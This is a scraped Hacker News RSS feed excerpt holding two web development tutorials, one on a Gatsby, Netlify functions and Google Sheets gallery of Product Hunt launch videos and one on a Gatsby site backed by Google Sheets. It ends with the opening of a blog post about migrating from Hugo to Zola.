        <h4><p>Your postgresql.conf documentation and recommendations.</p><p>Our mission is to help you tune and optimize your PostgreSQL configuration.</p><p>With around 270 configuration parameters in <span>postgresql.conf</span>, plus all the knobs in pg_hba.conf, it is definitely a difficult task!</p><p>How many parameters do you tune? 1? 8? 32? Ever tuned more than 64? We aim to make PostgreSQL configuration possible for HUMANS.</p></h4>
      </div>
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://postgresqlco.nf/en/doc/param/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024224</guid>
            <pubDate>Sun, 08 Nov 2020 08:52:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built the product hunt launch video gallery using Gatsby JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024206">thread link</a>) | @iliashad
<br/>
November 8, 2020 | https://iliashaddad.com/blog/how-i-built-the-product-hunt-launch-video-gallery-using-gatsby-js-google-sheets-and-product-hunt-api | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-i-built-the-product-hunt-launch-video-gallery-using-gatsby-js-google-sheets-and-product-hunt-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p>In this tutorial, I'll be sharing how I built the Product Hunt launch video gallery which use Product Hunt API, store the data in Google Sheets and display it using Gatsby JS. You can check out the website from <a href="https://product-hunt-launch-video.netlify.app/">this link</a></p><p>What I'll be covering today:</p><ul><li><p>Use Netlify functions to query data from Product Hunt API and store it in Google Sheets</p></li><li><p>Query data from Google Sheets and display it on Gatsby website</p></li><li><p>Download remote images to a local folder to utilize the power of Gatsby Images</p></li><li><p>Send GET requests using IFTTT to get fresh product launch video</p></li></ul><p>Let's do it.</p><h3>Use Netlify functions to query data from Product Hunt API and store it in Google Sheets</h3><ul><li>Install Gatsby CLI using Yarn</li></ul><pre data-language="" data-index="0"><code><span><span></span></span>
<span><span>yarn global add gatsby-cli</span></span>
<span><span></span></span></code></pre><p>or NPM</p><pre data-language="" data-index="1"><code><span><span></span></span>
<span><span>npm i gatsby-cli -g</span></span>
<span><span></span></span></code></pre><ul><li>Install Netlify Dev CLI to test Netlify functions locally using Yarn</li></ul><p>yarn global add netlify-cli</p><p>or NPM</p><pre data-language="" data-index="2"><code><span><span></span></span>
<span><span>npm i netlify-cli -g</span></span>
<span><span></span></span></code></pre><ul><li>Create new gatsby website using CLI</li></ul><pre data-language="" data-index="3"><code><span><span></span></span>
<span><span>gatsby new product-hunt-launch-video https://github.com/oddstronaut/gatsby-starter-tailwind</span></span>
<span><span></span></span></code></pre><ul><li>Run the Gatsby website</li></ul><pre data-language="" data-index="4"><code><span><span></span></span>
<span><span>cd product-hunt-launch-video &amp;&amp; gatsby develop</span></span>
<span><span></span></span></code></pre><ul><li>Create functions folder inside the root folder</li></ul><pre data-language="" data-index="5"><code><span><span></span></span>
<span><span>cd src &amp;&amp; mkdir functions</span></span>
<span><span></span></span></code></pre><ul><li>Create product-hunt.js ﬁle inside functions folder</li></ul><pre data-language="" data-index="6"><code><span><span></span></span>
<span><span>touch product-hunt.js</span></span>
<span><span></span></span></code></pre><ul><li>In the root directory, install node-fetch to fetch data from GraphQl API, dotenv to load</li></ul><p>env variables</p><pre data-language="" data-index="7"><code><span><span></span></span>
<span><span>yarn add node-fetch dotenv</span></span>
<span><span></span></span></code></pre><ul><li>We need to initialize a new netlify project</li></ul><pre data-language="" data-index="8"><code><span><span></span></span>
<span><span>netlify init</span></span>
<span><span></span></span></code></pre><p>and choose "No, I will connect this directory with GitHub ﬁrst" and follow the instructions</p><p>mentioned the command line</p><ul><li>Create netlify.toml ﬁle to conﬁg the netlﬁy website</li></ul><pre data-language="" data-index="9"><code><span><span></span></span>
<span><span>[build]</span></span>
<span><span></span></span>
<span><span>command = "yarn run build"</span></span>
<span><span></span></span>
<span><span>functions = "functions" # netlify dev uses this directory to scaffold a</span></span>
<span><span></span></span>
<span><span>publish = "public"</span></span>
<span><span></span></span></code></pre><ul><li>Create env ﬁle to hold Product Hunt API Key</li></ul><pre data-language="" data-index="10"><code><span><span></span></span>
<span><span>PH_ACCESS_TOKEN=</span></span>
<span><span></span></span></code></pre><p>In order to get your Product Hunt API Key, you need to login with your Product Hunt account</p><p>and check this <a href="https://api.producthunt.com/v2/oauth/applications">wesbite</a><a href="https://api.producthunt.com/v2/oauth/applications"> </a>and create new application and when you create a new application.</p><p>you'll have a Developer Access Token which never expires and we'll use this token in env ﬁle</p><p>In the product-hunt.js, we'll create the function to consume Product Hunt API</p><pre data-language="" data-index="11"><code><span><span></span></span>
<span><span>require("dotenv").config()</span></span>
<span><span></span></span>
<span><span>const fetch = require("node-fetch")</span></span>
<span><span></span></span>
<span><span>exports.handler = function (event, context, callback) {</span></span>
<span><span></span></span>
<span><span></span></span>
<span><span> const requestBody = {</span></span>
<span><span>    query: `</span></span>
<span><span>        {</span></span>
<span><span>            posts(order:RANKING) {</span></span>
<span><span>            </span></span>
<span><span>              edges {</span></span>
<span><span>                node {</span></span>
<span><span>                  name</span></span>
<span><span>                  url</span></span>
<span><span>                  topics {</span></span>
<span><span>                    edges {</span></span>
<span><span>                      node {</span></span>
<span><span>                         name</span></span>
<span><span>                      }</span></span>
<span><span>                    }</span></span>
<span><span>                  }</span></span>
<span><span>                  votesCount</span></span>
<span><span>                  media {</span></span>
<span><span>                    videoUrl</span></span>
<span><span>                    url</span></span>
<span><span>                  }</span></span>
<span><span>                  tagline</span></span>
<span><span>                </span></span>
<span><span>                  createdAt</span></span>
<span><span>                </span></span>
<span><span>                  </span></span>
<span><span>                }</span></span>
<span><span>              }</span></span>
<span><span>              </span></span>
<span><span>            }</span></span>
<span><span>          }</span></span>
<span><span>            `,</span></span>
<span><span>  };</span></span>
<span><span></span></span>
<span><span>fetch("https://api.producthunt.com/v2/api/graphql", {</span></span>
<span><span></span></span>
<span><span>method: "POST",</span></span>
<span><span></span></span>
<span><span>headers: {</span></span>
<span><span></span></span>
<span><span>authorization: `Bearer ${process.env.PH\_ACCESS\_TOKEN}`,</span></span>
<span><span></span></span>
<span><span>"Content-type": "Application/JSON",</span></span>
<span><span></span></span>
<span><span>},</span></span>
<span><span></span></span>
<span><span>body: JSON.stringify(requestBody),</span></span>
<span><span></span></span>
<span><span>})</span></span>
<span><span></span></span>
<span><span>.then(res =&gt; res.json())</span></span>
<span><span></span></span>
<span><span></span></span>
<span><span></span></span>
<span><span></span></span>
<span><span></span></span>
<span><span>.then(({ data }) =&gt; {</span></span>
<span><span></span></span>
<span><span>callback(null, {</span></span>
<span><span></span></span>
<span><span>statusCode: 200,</span></span>
<span><span></span></span>
<span><span>body: JSON.stringify({</span></span>
<span><span></span></span>
<span><span>message: "Success",</span></span>
<span><span></span></span>
<span><span>data: data.posts.edges,</span></span>
<span><span></span></span>
<span><span>}),</span></span>
<span><span></span></span>
<span><span>})</span></span>
<span><span></span></span>
<span><span>})</span></span>
<span><span></span></span>
<span><span>.catch(err =&gt; console.log(err))</span></span>
<span><span></span></span>
<span><span>}</span></span></code></pre><p>You need to run this script and check http://localhost:8888/.netlify/functions/product-hunt</p><p>to send a GET request to this netlify function and then send a POST request to Product</p><p>Hunt GraphQl API</p><pre data-language="" data-index="12"><code><span><span></span></span>
<span><span>netlify dev</span></span>
<span><span></span></span></code></pre><ul><li><p>We need to filter the product that had a launch video </p><pre data-language="" data-index="13"><code><span><span>    if (data) {</span></span>
<span><span>       const filterData = data.posts.edges.filter(el =&gt; {</span></span>
<span><span>      </span></span>
<span><span>         return el.node.media.map(el =&gt; el.videoUrl)[0] !== null</span></span>
<span><span>       })</span></span>
<span><span></span></span>
<span><span>       callback(null, {</span></span>
<span><span>         statusCode: 200,</span></span>
<span><span>         body: JSON.stringify({</span></span>
<span><span>           message: "Success",</span></span>
<span><span>           data: filterData,</span></span>
<span><span>         }),</span></span>
<span><span>       })</span></span>
<span><span>     }</span></span>
<span><span></span></span></code></pre><p>In this function, We checked if data is defined, filter posts data, map each product media array and return the videoUrl value, then we check if the first array item isn't null because the launch video is the first item in the media array </p></li></ul><p>Now, our code will look like this</p><pre data-language="" data-index="14"><code><span><span></span></span>
<span><span>require("dotenv").config()</span></span>
<span><span></span></span>
<span><span>const fetch = require("node-fetch")</span></span>
<span><span></span></span>
<span><span>exports.handler = function (event, context, callback) {</span></span>
<span><span>  const date = new Date(event.queryStringParameters.date).toISOString();</span></span>
<span><span></span></span>
<span><span>  const requestBody = {</span></span>
<span><span>    query: `</span></span>
<span><span>        {</span></span>
<span><span>            posts(order:RANKING,  postedBefore: ${date}) {</span></span>
<span><span>            </span></span>
<span><span>              edges {</span></span>
<span><span>                node {</span></span>
<span><span>                  name</span></span>
<span><span>                  url</span></span>
<span><span>                  topics {</span></span>
<span><span>                    edges {</span></span>
<span><span>                      node {</span></span>
<span><span>                         name</span></span>
<span><span>                      }</span></span>
<span><span>                    }</span></span>
<span><span>                  }</span></span>
<span><span>                  votesCount</span></span>
<span><span>                  media {</span></span>
<span><span>                    videoUrl</span></span>
<span><span>                    url</span></span>
<span><span>                  }</span></span>
<span><span>                  tagline</span></span>
<span><span>                </span></span>
<span><span>                  createdAt</span></span>
<span><span>                </span></span>
<span><span>                  </span></span>
<span><span>                }</span></span>
<span><span>              }</span></span>
<span><span>              </span></span>
<span><span>            }</span></span>
<span><span>          }</span></span>
<span><span>            `,</span></span>
<span><span>  }</span></span>
<span><span>  fetch("https://api.producthunt.com/v2/api/graphql", {</span></span>
<span><span>    method: "POST",</span></span>
<span><span>    headers: {</span></span>
<span><span>      authorization: `Bearer ${process.env.PH_ACCESS_TOKEN}`,</span></span>
<span><span>      "Content-type": "Application/JSON",</span></span>
<span><span>    },</span></span>
<span><span>    body: JSON.stringify(requestBody),</span></span>
<span><span>  })</span></span>
<span><span>    .then(res =&gt; res.json())</span></span>
<span><span>    .then(({ data }) =&gt; {</span></span>
<span><span>      if (data) {</span></span>
<span><span>        const filterData = data.posts.edges.filter(el =&gt; {</span></span>
<span><span>          return el.node.media.map(el =&gt; el.videoUrl)[0] !== null</span></span>
<span><span>        })</span></span>
<span><span></span></span>
<span><span>        callback(null, {</span></span>
<span><span>          statusCode: 200,</span></span>
<span><span>          body: JSON.stringify({</span></span>
<span><span>            message: "Success",</span></span>
<span><span>            data: filterData,</span></span>
<span><span>          }),</span></span>
<span><span>        })</span></span>
<span><span>      }</span></span>
<span><span>    })</span></span>
<span><span>    .catch(err =&gt; console.log(err))</span></span>
<span><span>}</span></span>
<span><span></span></span>
<span><span></span></span></code></pre><p>We're on the halfway to ﬁnish the netlify function</p><ul><li><p>You need create new Google spreadsheets at <a href="https://docs.google.com/spreadsheets/">Goo</a><a href="https://docs.google.com/spreadsheets/">g</a><a href="https://docs.google.com/spreadsheets/">le</a><a href="https://docs.google.com/spreadsheets/"> </a><a href="https://docs.google.com/spreadsheets/">Sheets</a></p></li><li><p>You need to get Google Sheets API credentials to be able to read data from sheets</p></li><li><p>Go to the Google APIs Console.</p></li><li><p>Create a new project.</p></li><li><p>Click Enable API. Search for and enable the Google Sheet API.</p></li><li><p>Create a new service account then, create a new API key and download the JSON file</p></li></ul><ul><li>Install Google Sheets Node JS SDK to add Product Hunt data to it</li></ul><pre data-language="" data-index="15"><code><span><span></span></span>
<span><span>yarn add google-spreadsheet util &amp;&amp; netlify dev</span></span>
<span><span></span></span></code></pre><ul><li>Access your Sheets using the Node JS SDK</li></ul><pre data-language="" data-index="16"><code><span><span></span></span>
<span><span> const acessSepreadSheet = async () =&gt; {</span></span>
<span><span>    const doc = new GoogleSpreadsheet(</span></span>
<span><span>      "YOUR GOOGLE SHEET ID"</span></span>
<span><span>    )</span></span>
<span><span></span></span>
<span><span>    await doc.useServiceAccountAuth({</span></span>
<span><span>      client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,</span></span>
<span><span>      private_key: process.env.GOOGLE_PRIVATE_KEY,</span></span>
<span><span>    })</span></span>
<span><span>    const info = await doc.loadInfo() // loads document properties and worksheets</span></span>
<span><span>    console.log(doc.title)</span></span>
<span><span>  }</span></span>
<span><span></span></span>
<span><span></span></span></code></pre><p>This function will access the Google Sheet and return the sheet title</p><p>Now, we need this row to add new product data like mentioned the screenshots below.</p><p><img src="https://dev-to-uploads.s3.amazonaws.com/i/1bbw0f9z3qphtjzwdlua.png" alt="Alt Text"></p><p>We need to write a function to add a new row </p><pre data-language="" data-index="17"><code><span><span></span></span>
<span><span> const accessSpreadSheet = async ({</span></span>
<span><span>    productName,</span></span>
<span><span>    topic,</span></span>
<span><span>    votesCount,</span></span>
<span><span>    videoUrl,</span></span>
<span><span>    featuredImage,</span></span>
<span><span>    url,</span></span>
<span><span>    created_at,</span></span>
<span><span>    description,</span></span>
<span><span>  }) =&gt; {</span></span>
<span><span>    const doc = new GoogleSpreadsheet(</span></span>
<span><span>      "YOUR SHEET ID"</span></span>
<span><span>    )</span></span>
<span><span></span></span>
<span><span>    // use service account creds</span></span>
<span><span>    await doc.useServiceAccountAuth({</span></span>
<span><span>      client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,</span></span>
<span><span>      private_key: process.env.GOOGLE_PRIVATE_KEY,</span></span>
<span><span>    })</span></span>
<span><span>    await doc.loadInfo() // loads document properties and worksheets</span></span>
<span><span></span></span>
<span><span>    const sheet = doc.sheetsByIndex[0] // or use doc.sheetsById[id]</span></span>
<span><span></span></span>
<span><span>    const row = {</span></span>
<span><span>      productName,</span></span>
<span><span>      topic,</span></span>
<span><span>      votesCount,</span></span>
<span><span>      videoUrl,</span></span>
<span><span>      featuredImage,</span></span>
<span><span>      url,</span></span>
<span><span>      created_at,</span></span>
<span><span>      description,</span></span>
<span><span>    }</span></span>
<span><span></span></span>
<span><span>    await sheet.addRow(row)</span></span>
<span><span>  }</span></span></code></pre><p>and the final code will look like this</p><pre data-language="" data-index="18"><code><span><span></span></span>
<span><span>require("dotenv").config()</span></span>
<span><span></span></span>
<span><span>const fetch = require("node-fetch")</span></span>
<span><span>const { GoogleSpreadsheet } = require("google-spreadsheet")</span></span>
<span><span>exports.handler = function (event, context, callback) {</span></span>
<span><span>  const date = new Date(event.queryStringParameters.date).toISOString();</span></span>
<span><span></span></span>
<span><span>  const accessSpreadSheet = async ({</span></span>
<span><span>    productName,</span></span>
<span><span>    topic,</span></span>
<span><span>    votesCount,</span></span>
<span><span>    videoUrl,</span></span>
<span><span>    featuredImage,</span></span>
<span><span>    url,</span></span>
<span><span>    created_at,</span></span>
<span><span>    description,</span></span>
<span><span>  }) =&gt; {</span></span>
<span><span>    const doc = new GoogleSpreadsheet(</span></span>
<span><span>      "YOUR SHEET ID"</span></span>
<span><span>    )</span></span>
<span><span></span></span>
<span><span>    // use service account creds</span></span>
<span><span>    await doc.useServiceAccountAuth({</span></span>
<span><span>      client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,</span></span>
<span><span>      private_key: process.env.GOOGLE_PRIVATE_KEY,</span></span>
<span><span>    })</span></span>
<span><span>    await doc.loadInfo() // loads document properties and worksheets</span></span>
<span><span></span></span>
<span><span>    const sheet = doc.sheetsByIndex[0] // or use doc.sheetsById[id]</span></span>
<span><span></span></span>
<span><span>    const row = {</span></span>
<span><span>      productName,</span></span>
<span><span>      topic,</span></span>
<span><span>      votesCount,</span></span>
<span><span>      videoUrl,</span></span>
<span><span>      featuredImage,</span></span>
<span><span>      url,</span></span>
<span><span>      created_at,</span></span>
<span><span>      description,</span></span>
<span><span>    }</span></span>
<span><span></span></span>
<span><span>    await sheet.addRow(row)</span></span>
<span><span>  }</span></span>
<span><span>  const requestBody = {</span></span>
<span><span>    query: `</span></span>
<span><span>        {</span></span>
<span><span>            posts(order:RANKING,  postedBefore: ${date}) {</span></span>
<span><span>            </span></span>
<span><span>              edges {</span></span>
<span><span>                node {</span></span>
<span><span>                  name</span></span>
<span><span>                  url</span></span>
<span><span>                  topics {</span></span>
<span><span>                    edges {</span></span>
<span><span>                      node {</span></span>
<span><span>                         name</span></span>
<span><span>                      }</span></span>
<span><span>                    }</span></span>
<span><span>                  }</span></span>
<span><span>                  votesCount</span></span>
<span><span>                  media {</span></span>
<span><span>                    videoUrl</span></span>
<span><span>                    url</span></span>
<span><span>                  }</span></span>
<span><span>                  tagline</span></span>
<span><span>                </span></span>
<span><span>                  createdAt</span></span>
<span><span>                </span></span>
<span><span>                  </span></span>
<span><span>                }</span></span>
<span><span>              }</span></span>
<span><span>              </span></span>
<span><span>            }</span></span>
<span><span>          }</span></span>
<span><span>            `,</span></span>
<span><span>  }</span></span>
<span><span>  fetch("https://api.producthunt.com/v2/api/graphql", {</span></span>
<span><span>    method: "POST",</span></span>
<span><span>    headers: {</span></span>
<span><span>      authorization: `Bearer ${process.env.PH_ACCESS_TOKEN}`,</span></span>
<span><span>      "Content-type": "Application/JSON",</span></span>
<span><span>    },</span></span>
<span><span>    body: JSON.stringify(requestBody),</span></span>
<span><span>  })</span></span>
<span><span>    .then(res =&gt; res.json())</span></span>
<span><span>    .then(async ({ data, status }) =&gt; {</span></span>
<span><span>      if (data) {</span></span>
<span><span>        const filterData = data.posts.edges.filter(el =&gt; {</span></span>
<span><span>          return el.node.media.map(el =&gt; el.videoUrl)[0] !== null</span></span>
<span><span>        })</span></span>
<span><span></span></span>
<span><span>        callback(null, {</span></span>
<span><span>          statusCode: 200,</span></span>
<span><span>          body: JSON.stringify({</span></span>
<span><span>            …</span></span></code></pre></div></article></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iliashaddad.com/blog/how-i-built-the-product-hunt-launch-video-gallery-using-gatsby-js-google-sheets-and-product-hunt-api">https://iliashaddad.com/blog/how-i-built-the-product-hunt-launch-video-gallery-using-gatsby-js-google-sheets-and-product-hunt-api</a></em></p>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-i-built-the-product-hunt-launch-video-gallery-using-gatsby-js-google-sheets-and-product-hunt-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024206</guid>
            <pubDate>Sun, 08 Nov 2020 08:47:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to build a Gatsby website with Google Sheets]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024204">thread link</a>) | @iliashad
<br/>
November 8, 2020 | https://iliashaddad.com/blog/how-to-build-a-gatsby-website-with-google-sheets | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-build-a-gatsby-website-with-google-sheets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <span></span>
  <img alt="Photo by Arian Darvishi on Unsplash" title="Photo by Arian Darvishi on Unsplash" src="https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/0a251/how-to-build-a-gatsby-website-with-google-sheets-0.jpg" srcset="https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/bce2d/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 250w,https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/953fe/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 500w,https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/0a251/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 1000w,https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/e3932/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 1500w,https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/451a4/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 2000w,https://iliashaddad.com/static/7b43ce90104c55d06ec59e66f30bb906/af240/how-to-build-a-gatsby-website-with-google-sheets-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span>
Photo by  <a href="https://unsplash.com/@arianismmm?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Arian Darvishi</a> on&nbsp;<a href="https://unsplash.com/s/photos/learning?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p><p>Recently I created a Gatsby website that uses Google sheets as Database and. It took me some time to get it right but the process was not that tough and once I completed it I thought I would share how to build similar one with basic functionality</p><h3>What we will be doing&nbsp;today?</h3><ul><li>Setup new Gatsby Project</li><li>Install and Config Gatsby Google Sheets Source Plugin</li><li>Fetch remote images and make them ready to use in Gatbsy Image</li><li>Query and Display the data from Google Sheets</li></ul><h3><strong>Setup New Gatsby&nbsp;Project</strong></h3><ul><li>Ensure you have the latest <strong>LTS</strong> version of Node installed (&gt;= 10.16.0). <code>node --version</code></li><li><a href="https://yarnpkg.com/en/docs/install">Install</a> the Yarn package manager.</li><li>Ensure you have the latest version of Yarn installed (&gt;= 1.0.2). <code>yarn --version</code></li></ul><p>First, install gatsby-cli globally</p><pre data-language="javascript" data-index="0"><code><span><span></span></span>
<span><span><span> </span><span>yarn</span><span> </span><span>global</span><span> </span><span>add</span><span> </span><span>gatsby</span><span>-</span><span>cli</span></span></span>
<span><span><span> </span></span></span></code></pre><p>Second, Create a new Gatsby website</p><pre data-language="javascript" data-index="1"><code><span><span></span></span>
<span><span><span>gatsby</span><span> </span><span>new</span><span> </span><span>gatsby</span><span>-</span><span>google</span><span>-</span><span>sheets</span><span>-</span><span>starter</span><span> </span></span></span>
<span><span></span></span></code></pre><p>Finally, run the Gatsby website</p><pre data-language="javascript" data-index="2"><code><span><span></span></span>
<span><span><span>gatsby</span><span>-</span><span>google</span><span>-</span><span>sheets</span><span>-</span><span>starte</span><span> </span><span>&amp;&amp;</span><span> </span><span>yarn</span><span> </span><span>develop</span></span></span>
<span><span></span></span></code></pre><h3><strong>Install and Config Gatsby Google Sheets Source&nbsp;Plugin</strong></h3><p>First, you need to get Google Sheets API credentials to be able to read data from sheets</p><ol><li>Go to the <a href="https://console.developers.google.com/">Google APIs Console</a>.</li><li>Create a new project.</li><li>Click <code>Enable API</code>. Search for and enable the Google Drive API.</li><li><code>Create credentials</code> for a <code>Web Server</code> to access <code>Application Data</code>.</li><li>Name the service account and grant it a <code>Project</code> Role of <code>Editor</code>.</li><li>Download the JSON file.</li><li>Copy the JSON file to your code directory and rename it to <code>secret.json</code></li></ol><p>Second, you need to install the gatsby source google sheets</p><pre data-language="javascript" data-index="3"><code><span><span></span></span>
<span><span><span> </span><span>yarn</span><span> </span><span>add</span><span> </span><span>gatsby</span><span>-</span><span>source</span><span>-</span><span>google</span><span>-</span><span>sheets</span></span></span>
<span><span></span></span></code></pre><p>Third, add the plugin in gatsby-config.js</p><pre data-language="javascript" data-index="4"><code><span><span></span></span>
<span><span><span>spreadsheetId</span><span>=</span><span> </span><span>// the id is after the [https://docs.google.com/spreadsheets/d/](https://docs.google.com/spreadsheets/d/)YOUR ID/edit#gid=0</span></span></span>
<span><span></span></span></code></pre><h3>Fetch remote images and make them ready to use in Gatbsy&nbsp;Image</h3><p>Note: I’ll use this G<a href="https://docs.google.com/spreadsheets/d/1L0aW6utYrcfd7xwYp1cIUkv8As4cFx1ECb0phF9-CEE/edit#gid=0">oogle Sheet</a> as a demo</p><p>First, install gatsby-source-filesystem</p><pre data-language="javascript" data-index="5"><code><span><span></span></span>
<span><span><span> </span><span>yarn</span><span> </span><span>add</span><span> </span><span>gatsby</span><span>-</span><span>source</span><span>-</span><span>filesystem</span><span> </span></span></span>
<span><span><span> </span></span></span></code></pre><p>Second, add this code to gatsby-node.js</p><p>Finally, replace node.featuredimage with the field where you have remote image URL</p><h3>Query and Display the data from Google&nbsp;Sheets</h3><p>First, change pages/index.js file</p><p>Second, run the gatsby website</p><pre data-language="javascript" data-index="6"><code><span><span></span></span>
<span><span><span>gatsby</span><span> </span><span>develop</span></span></span>
<span><span></span></span></code></pre><p>Voila, You have a Gatsby website powered by Google Sheets</p><p><span>
      <a href="https://iliashaddad.com/static/68f08f86dafba2bff6ae3f6a63fedfd0/78d47/1__TG1lwHGnlbim9PAbTBL42w.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Gatsby Website Powered By Google&nbsp;Sheets" title="Gatsby Website Powered By Google&nbsp;Sheets" src="https://iliashaddad.com/static/68f08f86dafba2bff6ae3f6a63fedfd0/78d47/1__TG1lwHGnlbim9PAbTBL42w.png" srcset="https://iliashaddad.com/static/68f08f86dafba2bff6ae3f6a63fedfd0/86700/1__TG1lwHGnlbim9PAbTBL42w.png 250w,https://iliashaddad.com/static/68f08f86dafba2bff6ae3f6a63fedfd0/0eb09/1__TG1lwHGnlbim9PAbTBL42w.png 500w,https://iliashaddad.com/static/68f08f86dafba2bff6ae3f6a63fedfd0/78d47/1__TG1lwHGnlbim9PAbTBL42w.png 800w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
Gatsby Website Powered By Google&nbsp;Sheets</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-build-a-gatsby-website-with-google-sheets</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024204</guid>
            <pubDate>Sun, 08 Nov 2020 08:47:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating My Blog to Zola]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024170">thread link</a>) | @todsacerdoti
<br/>
November 8, 2020 | https://mrkaran.dev/posts/migrating-to-zola/ | <a href="https://web.archive.org/web/*/https://mrkaran.dev/posts/migrating-to-zola/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<section>
    
    <article>
        <p>I've been writing on this blog for about 2 years now. This has been the longest I've stuck on to the same <em>technology stack</em> for my blog. I've previously jumped from a Jekyll based static site to a Medium blog before finally settling for <a href="https://gohugo.io/">Hugo</a>.</p>
<p>I've been using Hugo since 2018 but I don't recall as to <em>why</em> I went ahead with it. Maybe it was increasingly popular at that time and everyone touted Hugo as <em>the</em> solution to Static Site Generator (referred to as SSG from here on). There are 1000s of SSGs and at least a dozen of websites which lists all the SSGs out there. This is crazy by any standards. Hugo started as a generic blog generator but over the years it has become a <em>website generator</em>. It's no longer aimed at people who just want to have a small little static website/blog but supports all the use cases for people building full-fledged static websites. IMHO these two goals are overarching however this has resulted in a simple project to become incredibly complex over time.</p>
<h3 id="tipping-point">Tipping Point</h3>
<p>Anyway, so I wanted to change the look of the homepage on my website so I decided to look at Hugo's documentation. Hugo's documentation is great for someone who knows what exactly are they looking for. The documentation is so huge that you simply cannot grok it in one evening. I had zero ideas on how to customise the damn homepage of my blog and after spending hours buried in the documentation I was able to kind of figure the solution but it was unintuitive, to say the least. Apparently, to override any template from the theme, you have to mirror the directory structure of the theme in your root directory. Which meant, I needed to look at the source code of the theme, figure out the project structure, copy-paste all the folder names and put my override of <code>index.html</code> there. Which, BTW <strong>magically</strong> overrides it. This whole magic thing is BS and I am being strongly opinionated here.</p>
<p>There is more than one way to do something in Hugo. Different theme authors use different styles, which makes the whole thing even more complex. It also means for my customisations to work across themes, well you guessed it right: <strong>it's impossible</strong>.</p>
<p>Recently I discovered that I was unable to preview my Hugo website locally without internet because I had a Twitter <a href="https://gohugo.io/content-management/shortcodes/#tweet">shortcode</a> in one of my blog post (which makes an API call to Twitter to render a nice card preview). The site completely failed to render instead of just logging a warning. Bollocks.</p>
<p>The tipping point for me, however, was when the theme I was using stopped working with the latest version of Hugo at that point. So, picture this -- You make dozens of custom changes and then one update just <em>breaks</em> your website. Now not only you have to fix your shit but the theme you were using, you've to make upstream changes to the theme or maintain your own fork. And no, this is not a one-off experience. Hugo upgrades are a joke, they are known to break very very often.</p>
<p>I was done at this point. I didn't want to deal with this BS of continuously fighting the generator for my blog.</p>
<h3 id="a-fresh-change">A fresh change</h3>
<p>Being a practitioner of <a href="https://projects.csail.mit.edu/gsb/old-archive/gsb-archive/gsb2000-02-11.html">Yak Shaving</a>, I discussed the idea of a "tinyhugo" with <a href="https://nadh.in/">Kailash</a> and <a href="https://www.saratchandra.in/">Sarat</a>. We'd arrived at a spec and I started writing some code to pander to my NIH syndrome.</p>
<p>However, I was still not convinced that a simpler solution doesn't exist. I spent countless hours exploring other alternatives. I'd used <a href="https://www.getlektor.com/">Lektor</a>, <a href="https://blog.getpelican.com/">Pelican</a>, <a href="https://www.11ty.dev/">Eleventy</a> before finally stumbling upon <a href="https://www.getzola.org/">Zola</a> from HN/Lobster discussions. I've got to say, the landing page gave a <em>fresh</em> feeling - one that I've not seen with any other alternatives. In fact quite opposite to the Eleventy landing page which looks like an over-engineered piece of software to generate websites (Not hating on it, there might be use cases for it, but the JS tooling and dependency system is something that I would not want to touch with a 10ft pole).</p>
<p>Zola's primary appeal to me was that like Hugo it's extremely fast and comes as a single binary no dependency package. I looked at the docs the first impression was they are concise enough to get a basic idea. Zola is strongly opinionated, even to the extent of dictating a project structure and sometimes filenames too. I actually preferred this over the <em>magic</em> Hugo does. In less than 2 hours I was able to port the home page of my blog (and tweak it to my liking) in Zola. I decided to abandon my own <code>tinyhugo</code> attempt because for the very fact Zola fits my needs very well.</p>
<p>The thing that I really loved about Zola is how it enforces a separation between <a href="https://www.getzola.org/documentation/content/section/">Section</a> and <a href="https://www.getzola.org/documentation/content/page/">Pages</a>. The section represents a "collection" of posts. So a <em>blog</em> can be a section, and I can have another section called "Book Reviews". I could easily tell Zola where to look for the templates by specifying the same in <code>content/book_reviews/_index.md</code>. I don't have to read Hugo docs or do <em>Google-fu</em> to figure this out, it's right there in the docs and very apparent.</p>
<p>For the record, I still don't know how to customise different templates for different sections in Hugo, but I couldn't care less.</p>
<h3 id="migration">Migration</h3>
